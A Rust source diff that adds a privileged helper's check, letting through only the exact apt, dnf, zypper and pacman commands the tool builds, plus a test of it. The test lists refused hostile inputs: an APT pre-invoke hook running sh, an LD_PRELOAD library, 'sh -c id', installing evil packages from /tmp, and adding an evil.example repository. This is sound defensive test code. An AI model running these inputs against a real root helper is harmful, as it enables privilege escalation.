@@ -638,6 +638,52 @@ fn pacman_plan(m: Manager, action: Action, argv: &[String]) -> Result<Plan> {
     Ok(plan)
 }
 
+/// The privileged helper's check of a package manager command (`env
+/// DEBIAN_FRONTEND=noninteractive apt-get …`, `dnf …`, `zypper …`, `pacman
+/// …`): it must be exactly one [`command`] builds, on valid package names,
+/// and a real change must not remove a package the helper's policy
+/// protects or the system needs, by the manager's own dry run, as root.
+pub(super) fn helper_check(policy: &Policy, program: &str, args: &[String]) -> Result<()> {
+    let (m, argv): (Manager, Vec<String>) = match program {
+        "env" => (Manager::Apt, args.to_vec()),
+        "dnf" => (Manager::Dnf, std::iter::once(program.to_string()).chain(args.iter().cloned()).collect()),
+        "zypper" => (Manager::Zypper, std::iter::once(program.to_string()).chain(args.iter().cloned()).collect()),
+        "pacman" => (Manager::Pacman, std::iter::once(program.to_string()).chain(args.iter().cloned()).collect()),
+        _ => bail!("{program} isn't a package manager Orion drives"),
+    };
+    let refresh: &[&str] = match m {
+        Manager::Apt => &["DEBIAN_FRONTEND=noninteractive", "apt-get", "update", "-q"],
+        Manager::Dnf => &["dnf", "makecache", "-q"],
+        Manager::Zypper => &["zypper", "-n", "-q", "refresh"],
+        Manager::Pacman => &[],
+    };
+    if !refresh.is_empty() && argv == refresh {
+        return Ok(());
+    }
+    let packages: Vec<String> = argv.iter().position(|a| a == "--").map(|i| argv[i + 1..].to_vec()).unwrap_or_default();
+    ensure!(packages.len() <= 200, "name at most 200 packages");
+    for p in &packages {
+        package_name(p)?;
+    }
+    let up = |security_only, full| Action::Upgrade { security_only, full };
+    let actions = [Action::Install, Action::Remove, up(false, false), up(true, false), up(false, true), up(true, true)];
+    for action in actions {
+        for dry in [true, false] {
+            if command(m, action, &packages, dry) != argv {
+                continue;
+            }
+            if !dry {
+                // The helper's own dry run, and its own protected list. Any
+                // other removal was the asker's choice (`full`).
+                let plan = dry_run(policy, m, action, &packages)?;
+                guard_removals(policy, m, &plan, true)?;
+            }
+            return Ok(());
+        }
+    }
+    bail!("that isn't a command Orion makes for {}", m.name())
+}
+
 /// A process still running code an update replaced.
 #[derive(Debug, PartialEq)]
 struct Stale {
@@ -1172,6 +1218,45 @@ mod tests {
         assert_eq!(command(Manager::Zypper, up(false, false), &pkgs, false), ["zypper", "-n", "update", "--", "curl"]);
         assert_eq!(command(Manager::Pacman, Action::Install, &pkgs, false), ["pacman", "-S", "--needed", "--noconfirm", "--", "curl"]);
         assert_eq!(command(Manager::Pacman, up(false, false), &[], false), ["pacman", "-Syu", "--noconfirm"]);
+    }
+
+    #[test]
+    fn helper_takes_only_orions_package_commands() {
+        let p = Policy::from_toml("").unwrap();
+        let v = |a: &[&str]| a.iter().map(|x| x.to_string()).collect::<Vec<_>>();
+        let check = |program: &str, a: &[&str]| helper_check(&p, program, &v(a));
+        // What Orion sends: refreshing the lists, and dry runs.
+        assert!(check("env", &["DEBIAN_FRONTEND=noninteractive", "apt-get", "update", "-q"]).is_ok());
+        assert!(check("dnf", &["makecache", "-q"]).is_ok());
+        assert!(check("dnf", &["--assumeno", "upgrade", "--security"]).is_ok());
+        assert!(check("zypper", &["-n", "--xmlout", "install", "--dry-run", "--", "jq"]).is_ok());
+        // Anything else: an option that runs a command, another variable, a
+        // file instead of a package, a program that isn't a package manager.
+        let refused = [
+            ("env", v(&["DEBIAN_FRONTEND=noninteractive", "apt-get", "-o", "APT::Update::Pre-Invoke::=sh", "update", "-q"])),
+            ("env", v(&["LD_PRELOAD=/tmp/x.so", "apt-get", "update", "-q"])),
+            ("env", v(&["DEBIAN_FRONTEND=noninteractive", "sh", "-c", "id"])),
+            ("env", v(&["DEBIAN_FRONTEND=noninteractive", "apt-get", "-y", "-q", "-o", "Dpkg::Options::=--force-confold", "install", "--", "./evil.deb"])),
+            ("dnf", v(&["-y", "-q", "--setopt=pluginpath=/tmp", "install", "--", "jq"])),
+            ("pacman", v(&["-U", "--noconfirm", "--", "/tmp/evil.pkg.tar.zst"])),
+            ("zypper", v(&["-n", "addrepo", "http://evil.example/", "evil"])),
+            ("apt-get", v(&["update"])),
+        ];
+        for (program, args) in refused {
+            assert!(helper_check(&p, program, &args).is_err(), "{program} {args:?}");
+        }
+        // A real change is dry-run by the helper itself, against its policy.
+        if exec::installed("apt-get") && exec::installed("dpkg-query") {
+            let real = |verb: &str, pkg: &str| {
+                command(Manager::Apt, if verb == "remove" { Action::Remove } else { Action::Install }, &[pkg.to_string()], false)
+            };
+            let err = helper_check(&p, "env", &real("remove", "coreutils")).unwrap_err();
+            assert!(format!("{err:#}").contains("system needs"), "{err:#}");
+            // Protected by the helper's policy, even if the asker's says otherwise.
+            let strict = Policy::from_toml("[packages]\nprotected = [\"curl\"]\n").unwrap();
+            let err = helper_check(&strict, "env", &real("remove", "curl")).unwrap_err();
+            assert!(format!("{err:#}").contains("protected"), "{err:#}");
+        }
     }
 
     #[test]
